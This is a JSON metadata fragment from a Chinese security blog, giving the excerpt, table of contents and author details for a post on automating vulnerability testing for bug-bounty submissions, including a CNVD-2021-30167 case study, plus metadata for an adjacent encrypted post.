href=\"https://github.com/A1andNS/auto_vuln_test_script\">https://github.com/A1andNS/auto_vuln_test_script</a></p>\n","text":"最近开始在漏洞盒子挖挖事件型的洞，一开始也是手动测试，这样做就会发现效率明显不高，还很耗费精力。所以就联想到，以前听说过大佬们，都会去写一些脚本自己去扫描测试，所以我也上手试了一下。说实话，用脚本去验证是否存在漏洞很高效，如果大家参加过CTF AWD模式就会知道，主要就是利用自动...","link":"","photos":[],"count_time":{"symbolsCount":"5.7k","symbolsTime":"5 mins."},"categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":3,"path":"api/categories/漏洞挖掘.json"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":3,"path":"api/tags/漏洞挖掘.json"},{"name":"自动化","slug":"自动化","count":1,"path":"api/tags/自动化.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%8C%96%E6%8E%98%E4%BA%8B%E4%BB%B6%E5%9E%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87\"><span class=\"toc-text\">挖掘事件型漏洞的前期准备</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%94%B6%E9%9B%86EXP%E5%92%8CPOC\"><span class=\"toc-text\">收集EXP和POC</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">网络空间安全搜索引擎利用</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">自动化脚本开发思路</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%96%BD%E6%A1%88%E4%BE%8B-CNVD-2021-30167\"><span class=\"toc-text\">实施案例-CNVD-2021-30167</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"记今日挖src之收获","uid":"ad43d93f318aff02233a3f4998339b8e","slug":"记今日挖src之收获","date":"2021-07-21T12:36:31.000Z","updated":"2021-07-21T12:57:11.132Z","comments":true,"path":"api/articles/记今日挖src之收获.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/20210721205645.png","text":" 627feb16c11f197ed5323e23f4e567040fc22ee9b9e885eb25c4609e4f358d948c16362905e27a4c098dc9f980ec383516558c4629739d959178f5fe323af4ae657bf449651...","link":"","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":3,"path":"api/categories/漏洞挖掘.json"}],"tags":[{"name":"RCE","slug":"RCE","count":5,"path":"api/tags/RCE.json"},{"name":"加密文章","slug":"加密文章","count":3,"path":"api/tags/加密文章.json"},{"name":"漏洞挖掘","slug":"漏洞挖掘","count":3,"path":"api/tags/漏洞挖掘.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}